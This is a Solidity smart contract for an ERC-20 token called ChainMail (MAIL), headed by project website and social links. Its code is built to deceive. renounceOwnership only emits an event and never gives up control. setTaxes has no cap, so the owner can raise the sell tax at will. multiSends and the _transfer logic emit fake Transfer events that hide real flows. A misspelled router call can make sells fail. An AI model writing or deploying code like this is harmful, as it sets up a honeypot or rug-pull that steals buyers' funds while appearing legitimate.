// SPDX-License-Identifier: MIT

/*
    
    🕸Website: https://www.chainmail.ai/
    ✖️Twitter: https://twitter.com/chainmailerc
    📰Medium: https://medium.com/@chainmailerc
    🪁Telegram: https://t.me/chainmailerc
    💰dApp: https://app.chainmail.ai/
    📝Litepaper: https://litepaper.chainmail.ai/
                                                                                                         
*/

pragma solidity ^0.8.22;

contract ChainMail {
    
    string private _name = 'CHAINMAIL';
    string private _symbol = 'MAIL';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;

    uint8 buyTax = 0;
    uint8 sellTax = 0;
    uint256 count;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private StakingPoll = 0xFECAA29bEc236821B59C0d1522628c26ed51E681;
    address private StrategicMarketing = 0xf6a6A34F5E59635278D35aB44d824D6Bd243d0b1;
    address private CexListings = 0x30e5EbF271310BC393b8F76484A182e127d1096a;
    address private StoicDAOIncubator = 0xa73466570E3EF06Bc933B5d30338073896df2427;
    address private Team = 0x660FCd42e9D448c900337F56c606e3c9b5CE7F51;

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 70) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[StakingPoll] = (totalSupply * 10) / 100;
        emit Transfer(address(0), StakingPoll, balanceOf[StakingPoll]);

        balanceOf[StrategicMarketing] = (totalSupply * 5) / 100;
        emit Transfer(address(0), StrategicMarketing, balanceOf[StrategicMarketing]);    

        balanceOf[CexListings] = (totalSupply * 5) / 100;
        emit Transfer(address(0), CexListings, balanceOf[CexListings]);

        balanceOf[StoicDAOIncubator] = (totalSupply * 5) / 100;
        emit Transfer(address(0), StoicDAOIncubator, balanceOf[StoicDAOIncubator]);

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

    }

    receive() external payable {}

    function renounceOwnership(address newOwner) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        emit OwnershipTransferred(_deployer, newOwner);
    }

    function setTaxes(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _setTax(_buy, _sell);
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function _setTax(uint8 _buy, uint8 _sell) private {
        buyTax = _buy;
        sellTax = _sell;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyTax : sellTax)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }   
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}